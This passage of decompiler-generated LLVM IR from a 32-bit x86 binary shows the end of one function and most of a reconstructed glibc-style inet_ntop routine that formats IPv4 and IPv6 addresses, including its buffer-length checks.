  %tmp45 = icmp ugt i32 %v3_8057e81, %v0_8057dc0
  br i1 %tmp45, label %dec_label_pc_8057e8f, label %dec_label_pc_8057e9e

dec_label_pc_8057e8f:                             ; preds = %dec_label_pc_8057e74
  %v0_8057e8f = load i8*, i8** %stack_var_-92, align 4
  %v1_8057e8f = ptrtoint i8* %v0_8057e8f to i32
  %v2_8057e8f = call i32 @__errno_location(i32 %v1_8057e8f)
  %v1_8057e94 = inttoptr i32 %v2_8057e8f to i32*
  store i32 28, i32* %v1_8057e94, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8057ead.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057ead

dec_label_pc_8057e9e:                             ; preds = %dec_label_pc_8057e74
  %v2_8057e7c = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_8057ea14 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8057ea14, i32* %tmp29, align 4
  %v0_8057ea5.cast = inttoptr i32 %v3_8057ea14 to i8*
  %v4_8057ea5 = call i32 @strcpy(i8* %v0_8057ea5.cast, i32 %v2_8057e7c)
  store i32 %v4_8057ea5, i32* %eax.global-to-local, align 4
  %v0_8057eaa = load i32, i32* @esp, align 4
  %v6_8057eaa = icmp eq i32 %v0_8057eaa, -16
  store i1 %v6_8057eaa, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8057ead

dec_label_pc_8057ead:                             ; preds = %dec_label_pc_8057e8f, %dec_label_pc_8057e9e
  %v0_8057eb4 = phi i32 [ 0, %dec_label_pc_8057e8f ], [ %v4_8057ea5, %dec_label_pc_8057e9e ]
  %v0_8057ead = phi i32 [ %v0_8057ead.pre, %dec_label_pc_8057e8f ], [ %v15_8057daa, %dec_label_pc_8057e9e ]
  %v9_8057ead = icmp eq i32 %v0_8057ead, -60
  store i1 %v9_8057ead, i1* %zf.global-to-local, align 1
  store i32 %v0_8057da6, i32* @esi, align 4
  store i32 %v0_8057da5, i32* @edi, align 4
  ret i32 %v0_8057eb4

; uselistorder directives
  uselistorder i32 %v0_8057e6b, { 2, 0, 1 }
  uselistorder i8 %v2_8057e45, { 1, 0 }
  uselistorder i32 %v0_8057e2a, { 1, 0 }
  uselistorder i1 %v11_8057dfb, { 1, 0 }
  uselistorder i32 %v1_8057df2, { 1, 0 }
  uselistorder i32 %v5_8057de0, { 1, 0 }
  uselistorder i32 %v0_8057e6b30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 26, 27, 28, 17, 19, 20, 16, 18, 11, 21, 15, 22, 23, 24, 25, 29, 39, 40, 12, 34, 30, 13, 31, 32, 33, 35, 36, 14, 37, 38, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 4, 44, 45, 0, 1, 46, 47, 48, 51, 2, 3, 56, 57, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 49, 50, 52, 53, 54, 55 }
  uselistorder label %dec_label_pc_8057ead, { 1, 0 }
  uselistorder label %dec_label_pc_8057e4b, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8057eb6 = load i32, i32* @edi, align 4
  %v0_8057eb7 = load i32, i32* @esi, align 4
  %v0_8057eb8 = load i32, i32* @ebx, align 4
  %v15_8057eb9 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8057ec0 = icmp eq i32 %arg1, 2
  br i1 %v9_8057ec0, label %dec_label_pc_8057ed0, label %dec_label_pc_8057ec5

dec_label_pc_8057ec5:                             ; preds = %entry
  %v9_8057ec5 = icmp eq i32 %arg1, 10
  %v1_8057ec8 = icmp eq i1 %v9_8057ec5, false
  br i1 %v1_8057ec8, label %dec_label_pc_805806f, label %dec_label_pc_8057ee8

dec_label_pc_8057ed0:                             ; preds = %entry
  %v4_8057ed0 = ptrtoint i8* %arg3 to i32
  store i32 %v4_8057ed0, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8057edc = call i32 @inet_ntop4(i32 %v0_8057eb8, i32 %v0_8057eb7, i32 %v0_8057eb6)
  store i32 %v3_8057edc, i32* %eax.global-to-local, align 4
  store i32 %v3_8057edc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805807c

dec_label_pc_8057ee8:                             ; preds = %dec_label_pc_8057ec5
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8057eed = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8057eed, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8057ef2 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8057ef2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8057f14 = add i32 %arg2, 1
  br label %dec_label_pc_8057efe

dec_label_pc_8057efe:                             ; preds = %dec_label_pc_8057efe.dec_label_pc_8057efe_crit_edge, %dec_label_pc_8057ee8
  %v1_8057f21 = phi i32 [ %v15_8057eb9, %dec_label_pc_8057ee8 ], [ %v1_8057f21.pre, %dec_label_pc_8057efe.dec_label_pc_8057efe_crit_edge ]
  %v0_8057f1970 = phi i32 [ 0, %dec_label_pc_8057ee8 ], [ %v0_8057f25.pre, %dec_label_pc_8057efe.dec_label_pc_8057efe_crit_edge ]
  %v1_8057f07 = ashr i32 %v0_8057f1970, 31
  %v2_8057f08 = zext i32 %v0_8057f1970 to i64
  %v4_8057f08 = zext i32 %v1_8057f07 to i64
  %v5_8057f08 = mul nuw i64 %v4_8057f08, 4294967296
  %v6_8057f08 = or i64 %v5_8057f08, %v2_8057f08
  %v8_8057f08 = sdiv i64 %v6_8057f08, 2
  %v9_8057f08 = trunc i64 %v8_8057f08 to i32
  store i32 %v9_8057f08, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8057f08, i32* %ebx.global-to-local, align 4
  %v2_8057f10 = add i32 %v0_8057f1970, %arg2
  %v3_8057f10 = inttoptr i32 %v2_8057f10 to i8*
  %v4_8057f10 = load i8, i8* %v3_8057f10, align 1
  %v5_8057f10 = zext i8 %v4_8057f10 to i32
  store i32 %v5_8057f10, i32* %eax.global-to-local, align 4
  %v3_8057f14 = add i32 %v2_8057f14, %v0_8057f1970
  %v4_8057f14 = inttoptr i32 %v3_8057f14 to i8*
  %v5_8057f14 = load i8, i8* %v4_8057f14, align 1
  %v6_8057f14 = zext i8 %v5_8057f14 to i32
  store i32 %v6_8057f14, i32* %edx.global-to-local, align 4
  %v1_8057f19 = add i32 %v0_8057f1970, 2
  store i32 %v1_8057f19, i32* %ecx.global-to-local, align 4
  %v2_8057f1c = mul nuw nsw i32 %v5_8057f10, 256
  %v2_8057f1f = or i32 %v6_8057f14, %v2_8057f1c
  store i32 %v2_8057f1f, i32* %eax.global-to-local, align 4
  %v3_8057f21 = mul i32 %v9_8057f08, 4
  %v4_8057f21 = add i32 %v3_8057f21, 60
  %v5_8057f21 = add i32 %v4_8057f21, %v1_8057f21
  %v6_8057f21 = inttoptr i32 %v5_8057f21 to i32*
  store i32 %v2_8057f1f, i32* %v6_8057f21, align 4
  %v0_8057f25.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8057f28 = icmp sgt i32 %v0_8057f25.pre, 15
  br i1 %v7_8057f28, label %dec_label_pc_8057f2a, label %dec_label_pc_8057efe.dec_label_pc_8057efe_crit_edge

dec_label_pc_8057efe.dec_label_pc_8057efe_crit_edge: ; preds = %dec_label_pc_8057efe
  %v1_8057f21.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057efe

dec_label_pc_8057f2a:                             ; preds = %dec_label_pc_8057efe
  %v4_8057ee8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8057f34.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057f34

dec_label_pc_8057f34:                             ; preds = %dec_label_pc_8057f2a, %dec_label_pc_8057f61
  %v0_8057f6169 = phi i32 [ 0, %dec_label_pc_8057f2a ], [ %v1_8057f61, %dec_label_pc_8057f61 ]
  %v0_8057f4c68 = phi i32 [ -1, %dec_label_pc_8057f2a ], [ %v0_8057f4c8, %dec_label_pc_8057f61 ]
  %v0_8057f6c67 = phi i32 [ -1, %dec_label_pc_8057f2a ], [ %v0_8057f519, %dec_label_pc_8057f61 ]
  %v0_8057f7766 = phi i32 [ -1, %dec_label_pc_8057f2a ], [ %v0_8057f5c13, %dec_label_pc_8057f61 ]
  %v2_8057f34 = mul nuw nsw i32 %v0_8057f6169, 4
  %v3_8057f34 = add nuw nsw i32 %v2_8057f34, 60
  %v4_8057f34 = add i32 %v3_8057f34, %v0_8057f34.pre
  %v5_8057f34 = inttoptr i32 %v4_8057f34 to i32*
  %v6_8057f34 = load i32, i32* %v5_8057f34, align 4
  %v7_8057f34 = icmp eq i32 %v6_8057f34, 0
  %v1_8057f39 = icmp eq i1 %v7_8057f34, false
  %v10_8057f4c = icmp eq i32 %v0_8057f4c68, -1
  br i1 %v1_8057f39, label %dec_label_pc_8057f4c, label %dec_label_pc_8057f3b

dec_label_pc_8057f3b:                             ; preds = %dec_label_pc_8057f34
  %v1_8057f3e = icmp eq i1 %v10_8057f4c, false
  br i1 %v1_8057f3e, label %dec_label_pc_8057f49, label %dec_label_pc_8057f40

dec_label_pc_8057f40:                             ; preds = %dec_label_pc_8057f3b
  store i32 %v0_8057f6169, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057f61

dec_label_pc_8057f49:                             ; preds = %dec_label_pc_8057f3b
  %v0_8057f49 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057f49 = add i32 %v0_8057f49, 1
  store i32 %v1_8057f49, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057f61

dec_label_pc_8057f4c:                             ; preds = %dec_label_pc_8057f34
  br i1 %v10_8057f4c, label %dec_label_pc_8057f61, label %dec_label_pc_8057f51

dec_label_pc_8057f51:                             ; preds = %dec_label_pc_8057f4c
  %v10_8057f51 = icmp eq i32 %v0_8057f6c67, -1
  %v0_8057f5a.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057f56 = load i32, i32* @ebp, align 4
  %v7_8057f58 = icmp sgt i32 %v0_8057f5a.pre, %v1_8057f56
  %or.cond = or i1 %v10_8057f51, %v7_8057f58
  br i1 %or.cond, label %dec_label_pc_8057f5a, label %dec_label_pc_8057f5e

dec_label_pc_8057f5a:                             ; preds = %dec_label_pc_8057f51
  store i32 %v0_8057f5a.pre, i32* @ebp, align 4
  store i32 %v0_8057f7766, i32* @edi, align 4
  br label %dec_label_pc_8057f5e

dec_label_pc_8057f5e:                             ; preds = %dec_label_pc_8057f51, %dec_label_pc_8057f5a
  %v0_8057f5111 = phi i32 [ %v0_8057f7766, %dec_label_pc_8057f5a ], [ %v0_8057f6c67, %dec_label_pc_8057f51 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057f61

dec_label_pc_8057f61:                             ; preds = %dec_label_pc_8057f4c, %dec_label_pc_8057f49, %dec_label_pc_8057f40, %dec_label_pc_8057f5e
  %v0_8057f5c13 = phi i32 [ %v0_8057f7766, %dec_label_pc_8057f4c ], [ %v0_8057f7766, %dec_label_pc_8057f49 ], [ %v0_8057f6169, %dec_label_pc_8057f40 ], [ -1, %dec_label_pc_8057f5e ]
  %v0_8057f4c8 = phi i32 [ -1, %dec_label_pc_8057f4c ], [ %v0_8057f4c68, %dec_label_pc_8057f49 ], [ %v0_8057f6169, %dec_label_pc_8057f40 ], [ -1, %dec_label_pc_8057f5e ]
  %v0_8057f519 = phi i32 [ %v0_8057f6c67, %dec_label_pc_8057f4c ], [ %v0_8057f6c67, %dec_label_pc_8057f49 ], [ %v0_8057f6c67, %dec_label_pc_8057f40 ], [ %v0_8057f5111, %dec_label_pc_8057f5e ]
  %v1_8057f61 = add nuw nsw i32 %v0_8057f6169, 1
  store i32 %v1_8057f61, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8057f61, 8
  br i1 %exitcond, label %dec_label_pc_8057f67, label %dec_label_pc_8057f34

dec_label_pc_8057f67:                             ; preds = %dec_label_pc_8057f61
  %v10_8057f67 = icmp eq i32 %v0_8057f5c13, -1
  br i1 %v10_8057f67, label %dec_label_pc_8057f79, label %dec_label_pc_8057f6c

dec_label_pc_8057f6c:                             ; preds = %dec_label_pc_8057f67
  %v10_8057f6c = icmp eq i32 %v0_8057f519, -1
  %v0_8057f75.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8057f6c, label %dec_label_pc_8057f75, label %dec_label_pc_8057f71

dec_label_pc_8057f71:                             ; preds = %dec_label_pc_8057f6c
  %v1_8057f71 = load i32, i32* @ebp, align 4
  %v7_8057f73 = icmp sgt i32 %v0_8057f75.pre, %v1_8057f71
  br i1 %v7_8057f73, label %dec_label_pc_8057f75, label %dec_label_pc_8057f79

dec_label_pc_8057f75:                             ; preds = %dec_label_pc_8057f6c, %dec_label_pc_8057f71
  store i32 %v0_8057f75.pre, i32* @ebp, align 4
  store i32 %v0_8057f5c13, i32* @edi, align 4
  br label %dec_label_pc_8057f79

dec_label_pc_8057f79:                             ; preds = %dec_label_pc_8057f71, %dec_label_pc_8057f67, %dec_label_pc_8057f75
  %v5_8057f86 = phi i32 [ %v0_8057f519, %dec_label_pc_8057f71 ], [ %v0_8057f519, %dec_label_pc_8057f67 ], [ %v0_8057f5c13, %dec_label_pc_8057f75 ]
  %v10_8057f79 = icmp eq i32 %v5_8057f86, -1
  br i1 %v10_8057f79, label %dec_label_pc_8057f89, label %dec_label_pc_8057f7e

dec_label_pc_8057f7e:                             ; preds = %dec_label_pc_8057f79
  %v0_8057f7e = load i32, i32* @ebp, align 4
  %v1_8057f7e = add i32 %v0_8057f7e, -1
  %v6_8057f7e = sub i32 0, %v0_8057f7e
  %v7_8057f7e = and i32 %v0_8057f7e, %v6_8057f7e
  %v8_8057f7e = icmp slt i32 %v7_8057f7e, 0
  %v9_8057f7e = icmp eq i32 %v1_8057f7e, 0
  %v10_8057f7e = icmp slt i32 %v1_8057f7e, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8057f86 = icmp ne i1 %v10_8057f7e, %v8_8057f7e
  %v4_8057f86 = or i1 %v9_8057f7e, %v3_8057f86
  %v7_8057f86 = select i1 %v4_8057f86, i32 -1, i32 %v5_8057f86
  store i32 %v7_8057f86, i32* @edi, align 4
  br label %dec_label_pc_8057f89

dec_label_pc_8057f89:                             ; preds = %dec_label_pc_8057f79, %dec_label_pc_8057f7e
  %v0_805802918 = phi i32 [ %v5_8057f86, %dec_label_pc_8057f79 ], [ %v7_8057f86, %dec_label_pc_8057f7e ]
  %v2_8057f89 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8057f89, i32* @ebx, align 4
  %v3_805800b = add i32 %v4_8057ee8, 64
  %v12_8057fc9 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805802958 = icmp eq i32 %v0_805802918, -1
  %v1_8057fd1 = icmp eq i1 %v12_8057fc9, false
  br label %dec_label_pc_8057f94

dec_label_pc_8057f94:                             ; preds = %dec_label_pc_8057f89, %dec_label_pc_805801f
  %v10_805802965 = phi i1 [ %v10_805802958, %dec_label_pc_8057f89 ], [ %v10_8058029, %dec_label_pc_805801f ]
  %v0_8057fae64 = phi i32 [ 0, %dec_label_pc_8057f89 ], [ %v1_805801f, %dec_label_pc_805801f ]
  %v1_8057fa463 = phi i32 [ %v0_805802918, %dec_label_pc_8057f89 ], [ %v0_8058029.pre, %dec_label_pc_805801f ]
  %v0_8057fb262 = phi i32 [ %v2_8057f89, %dec_label_pc_8057f89 ], [ %v0_8057fa819, %dec_label_pc_805801f ]
  %stack_var_-120.161 = phi i8* [ null, %dec_label_pc_8057f89 ], [ %stack_var_-120.0, %dec_label_pc_805801f ]
  %stack_var_-116.160 = phi i32 [ 32, %dec_label_pc_8057f89 ], [ %stack_var_-116.0, %dec_label_pc_805801f ]
  br i1 %v10_805802965, label %dec_label_pc_8057fae, label %dec_label_pc_8057f99

dec_label_pc_8057f99:                             ; preds = %dec_label_pc_8057f94
  %v2_8057f99 = sub i32 %v0_8057fae64, %v1_8057fa463
  %v8_8057f99 = xor i32 %v0_8057fae64, %v1_8057fa463
  %v9_8057f99 = xor i32 %v2_8057f99, %v0_8057fae64
  %v10_8057f99 = and i32 %v9_8057f99, %v8_8057f99
  %v11_8057f99 = icmp slt i32 %v10_8057f99, 0
  %v12_8057f99 = icmp eq i32 %v2_8057f99, 0
  %v13_8057f99 = icmp slt i32 %v2_8057f99, 0
  %v2_8057f9b = icmp eq i1 %v13_8057f99, %v11_8057f99
  br i1 %v2_8057f9b, label %dec_label_pc_8057f9d, label %dec_label_pc_8057fae

dec_label_pc_8057f9d:                             ; preds = %dec_label_pc_8057f99
  %v1_8057f9d = load i32, i32* @ebp, align 4
  %v2_8057f9d = add i32 %v1_8057f9d, %v1_8057fa463
  store i32 %v2_8057f9d, i32* %eax.global-to-local, align 4
  %v2_8057fa0 = sub i32 %v0_8057fae64, %v2_8057f9d
  %v8_8057fa0 = xor i32 %v2_8057f9d, %v0_8057fae64
  %v9_8057fa0 = xor i32 %v2_8057fa0, %v0_8057fae64
  %v10_8057fa0 = and i32 %v9_8057fa0, %v8_8057fa0
  %v11_8057fa0 = icmp slt i32 %v10_8057fa0, 0
  %v13_8057fa0 = icmp slt i32 %v2_8057fa0, 0
  %v2_8057fa2 = icmp eq i1 %v13_8057fa0, %v11_8057fa0
  br i1 %v2_8057fa2, label %dec_label_pc_8057fae, label %dec_label_pc_8057fa4

dec_label_pc_8057fa4:                             ; preds = %dec_label_pc_8057f9d
  %v1_8057fa6 = icmp eq i1 %v12_8057f99, false
  br i1 %v1_8057fa6, label %dec_label_pc_805801f, label %dec_label_pc_8057fa8

dec_label_pc_8057fa8:                             ; preds = %dec_label_pc_8057fa4
  %v1_8057fa8 = inttoptr i32 %v0_8057fb262 to i8*
  store i8 58, i8* %v1_8057fa8, align 1
  %v0_8057fab = load i32, i32* @ebx, align 4
  %v1_8057fab = add i32 %v0_8057fab, 1
  store i32 %v1_8057fab, i32* @ebx, align 4
  br label %dec_label_pc_805801f

dec_label_pc_8057fae:                             ; preds = %dec_label_pc_8057f99, %dec_label_pc_8057f9d, %dec_label_pc_8057f94
  %v1_8057fae = icmp eq i32 %v0_8057fae64, 0
  br i1 %v1_8057fae, label %dec_label_pc_8057fb6, label %dec_label_pc_8057fb2

dec_label_pc_8057fb2:                             ; preds = %dec_label_pc_8057fae
  %v1_8057fb2 = inttoptr i32 %v0_8057fb262 to i8*
  store i8 58, i8* %v1_8057fb2, align 1
  %v0_8057fb5 = load i32, i32* @ebx, align 4
  %v1_8057fb5 = add i32 %v0_8057fb5, 1
  store i32 %v1_8057fb5, i32* @ebx, align 4
  %v0_8057fb6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057fb6

dec_label_pc_8057fb6:                             ; preds = %dec_label_pc_8057fae, %dec_label_pc_8057fb2
  %v0_8058014 = phi i32 [ %v0_8057fb262, %dec_label_pc_8057fae ], [ %v1_8057fb5, %dec_label_pc_8057fb2 ]
  %v1_805800b = phi i32 [ 0, %dec_label_pc_8057fae ], [ %v0_8057fb6.pre, %dec_label_pc_8057fb2 ]
  %v9_8057fb6 = icmp eq i32 %v1_805800b, 6
  %v1_8057fb9 = icmp eq i1 %v9_8057fb6, false
  br i1 %v1_8057fb9, label %dec_label_pc_805800a, label %dec_label_pc_8057fbb

dec_label_pc_8057fbb:                             ; preds = %dec_label_pc_8057fb6
  %v0_8057fbb = load i32, i32* @edi, align 4
  %v1_8057fbb = icmp eq i32 %v0_8057fbb, 0
  %v1_8057fbd = icmp eq i1 %v1_8057fbb, false
  br i1 %v1_8057fbd, label %dec_label_pc_805800a, label %dec_label_pc_8057fbf

dec_label_pc_8057fbf:                             ; preds = %dec_label_pc_8057fbb
  %v0_8057fbf = load i32, i32* @ebp, align 4
  %v9_8057fbf = icmp eq i32 %v0_8057fbf, 6
  br i1 %v9_8057fbf, label %dec_label_pc_8057fd3, label %dec_label_pc_8057fc4

dec_label_pc_8057fc4:                             ; preds = %dec_label_pc_8057fbf
  %v9_8057fc4 = icmp eq i32 %v0_8057fbf, 5
  %v1_8057fc7 = icmp eq i1 %v9_8057fc4, false
  br i1 %v1_8057fc7, label %dec_label_pc_805800a, label %dec_label_pc_8057fc9

dec_label_pc_8057fc9:                             ; preds = %dec_label_pc_8057fc4
  br i1 %v1_8057fd1, label %dec_label_pc_805800a, label %dec_label_pc_8057fd3

dec_label_pc_8057fd3:                             ; preds = %dec_label_pc_8057fc9, %dec_label_pc_8057fbf
  %v2_8057fd9 = sub i32 %v0_8058014, %v2_8057f89
  store i32 %v2_8057fd9, i32* @esi, align 4
  %v2_8057fe4 = sub i32 46, %v2_8057fd9
  store i32 %v2_8057fe4, i32* @ecx, align 4
  store i32 %v0_8058014, i32* @edx, align 4
  %v1_8057fe8 = add i32 %arg2, 12
  store i32 %v1_8057fe8, i32* @eax, align 4
  %v0_8057feb = load i8*, i8** %stack_var_-124, align 4
  %v1_8057feb = ptrtoint i8* %v0_8057feb to i32
  %v3_8057feb = ptrtoint i8* %stack_var_-120.161 to i32
  %v5_8057feb = call i32 @inet_ntop4(i32 %v1_8057feb, i32 %v3_8057feb, i32 %stack_var_-116.160)
  store i32 %v5_8057feb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057ff2 = icmp eq i32 %v5_8057feb, 0
  br i1 %v1_8057ff2, label %dec_label_pc_805807c, label %dec_label_pc_8057ffa

dec_label_pc_8057ffa:                             ; preds = %dec_label_pc_8057fd3
  %v0_8057ffd = load i32, i32* @ebx, align 4
  %v5_8057ffd = inttoptr i32 %v0_8057ffd to i8*
  store i8* %v5_8057ffd, i8** %stack_var_-124, align 4
  %v3_8057ffe = call i32 @strlen(i8* %v5_8057ffd)
  store i32 %v3_8057ffe, i32* %eax.global-to-local, align 4
  %v0_8058006 = load i32, i32* @ebx, align 4
  %v3_8058006 = add i32 %v0_8058006, %v3_8057ffe
  store i32 %v3_8058006, i32* @ebx, align 4
  %v0_805802e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805802e

dec_label_pc_805800a:                             ; preds = %dec_label_pc_8057fc9, %dec_label_pc_8057fc4, %dec_label_pc_8057fbb, %dec_label_pc_8057fb6
  %v0_805800a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805800a, i32* %stack_var_-112, align 4
  %v2_805800b = mul i32 %v1_805800b, 4
  %v4_805800b = add i32 %v3_805800b, %v2_805800b
  %v5_805800b = inttoptr i32 %v4_805800b to i32*
  %v6_805800b = load i32, i32* %v5_805800b, align 4
  %v5_8058014 = inttoptr i32 %v0_8058014 to i8*
  store i8* %v5_8058014, i8** %stack_var_-124, align 4
  %v4_8058015 = call i32 @sprintf(i32 %v0_8058014, i32 ptrtoint ([3 x i8]* @global_var_805d491.598 to i32))
  store i32 %v4_8058015, i32* %eax.global-to-local, align 4
  %v0_805801d = load i32, i32* @ebx, align 4
  %v2_805801d = add i32 %v0_805801d, %v4_8058015
  store i32 %v2_805801d, i32* @ebx, align 4
  br label %dec_label_pc_805801f

dec_label_pc_805801f:                             ; preds = %dec_label_pc_8057fa4, %dec_label_pc_8057fa8, %dec_label_pc_805800a
  %stack_var_-116.0 = phi i32 [ %v6_805800b, %dec_label_pc_805800a ], [ %stack_var_-116.160, %dec_label_pc_8057fa4 ], [ %stack_var_-116.160, %dec_label_pc_8057fa8 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805d491.598, i32 0, i32 0), %dec_label_pc_805800a ], [ %stack_var_-120.161, %dec_label_pc_8057fa4 ], [ %stack_var_-120.161, %dec_label_pc_8057fa8 ]
  %v0_8057fa819 = phi i32 [ %v2_805801d, %dec_label_pc_805800a ], [ %v0_8057fb262, %dec_label_pc_8057fa4 ], [ %v1_8057fab, %dec_label_pc_8057fa8 ]
  %v0_805801f = load i32, i32* @esi, align 4
  %v1_805801f = add i32 %v0_805801f, 1
  %v0_8058029.pre = load i32, i32* @edi, align 4
  store i32 %v1_805801f, i32* @esi, align 4
  %v7_8058023 = icmp sgt i32 %v1_805801f, 7
  %v10_8058029 = icmp eq i32 %v0_8058029.pre, -1
  br i1 %v7_8058023, label %dec_label_pc_8058029, label %dec_label_pc_8057f94

dec_label_pc_8058029:                             ; preds = %dec_label_pc_805801f
  br i1 %v10_8058029, label %dec_label_pc_805803a, label %dec_label_pc_805802e

dec_label_pc_805802e:                             ; preds = %dec_label_pc_8058029, %dec_label_pc_8057ffa
  %v0_8058036 = phi i32 [ %v0_8057fa819, %dec_label_pc_8058029 ], [ %v3_8058006, %dec_label_pc_8057ffa ]
  %v0_805802e = phi i32 [ %v0_8058029.pre, %dec_label_pc_8058029 ], [ %v0_805802e.pre, %dec_label_pc_8057ffa ]
  %v1_805802e = load i32, i32* @ebp, align 4
  %v2_805802e = add i32 %v1_805802e, %v0_805802e
  store i32 %v2_805802e, i32* %eax.global-to-local, align 4
  %v9_8058031 = icmp eq i32 %v2_805802e, 8
  %v1_8058034 = icmp eq i1 %v9_8058031, false
  br i1 %v1_8058034, label %dec_label_pc_805803a, label %dec_label_pc_8058036

dec_label_pc_8058036:                             ; preds = %dec_label_pc_805802e
  %v1_8058036 = inttoptr i32 %v0_8058036 to i8*
  store i8 58, i8* %v1_8058036, align 1
  %v0_8058039 = load i32, i32* @ebx, align 4
  %v1_8058039 = add i32 %v0_8058039, 1
  store i32 %v1_8058039, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805803a

dec_label_pc_805803a:                             ; preds = %dec_label_pc_805802e, %dec_label_pc_8058029, %dec_label_pc_8058036
  %v0_805803e = phi i32 [ %v0_8058036, %dec_label_pc_805802e ], [ %v0_8057fa819, %dec_label_pc_8058029 ], [ %v1_8058039, %dec_label_pc_8058036 ]
  store i32 %v2_8057f89, i32* %edx.global-to-local, align 4
  %v1_805803e = add i32 %v0_805803e, 1
  store i32 %v1_805803e, i32* %eax.global-to-local, align 4
  %v1_8058041 = inttoptr i32 %v0_805803e to i8*
  store i8 0, i8* %v1_8058041, align 1
  %v0_8058044 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058044 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058044 = sub i32 %v0_8058044, %v1_8058044
  store i32 %v2_8058044, i32* @eax, align 4
  %tmp75 = icmp ugt i32 %v2_8058044, %arg4
  br i1 %tmp75, label %dec_label_pc_805804c, label %dec_label_pc_8058059

dec_label_pc_805804c:                             ; preds = %dec_label_pc_805803a
  %v0_805804c = load i8*, i8** %stack_var_-124, align 4
  %v1_805804c = ptrtoint i8* %v0_805804c to i32
  %v2_805804c = call i32 @__errno_location(i32 %v1_805804c)
  store i32 %v2_805804c, i32* %eax.global-to-local, align 4
  %v1_8058051 = inttoptr i32 %v2_805804c to i32*
  store i32 28, i32* %v1_8058051, align 4
  br label %dec_label_pc_805807a

dec_label_pc_8058059:                             ; preds = %dec_label_pc_805803a
  %v0_8058059 = load i32, i32* @edi, align 4
  store i32 %v0_8058059, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_805805c2 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_805805c2, i32* %tmp46, align 4
  %v0_8058063.cast = inttoptr i32 %v3_805805c2 to i8*
  %v5_8058063 = call i32 @strcpy(i8* %v0_8058063.cast, i32 %v2_8057f89)
  store i32 %v5_8058063, i32* %eax.global-to-local, align 4
  store i32 %v5_8058063, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805807c

dec_label_pc_805806f:                             ; preds = %dec_label_pc_8057ec5
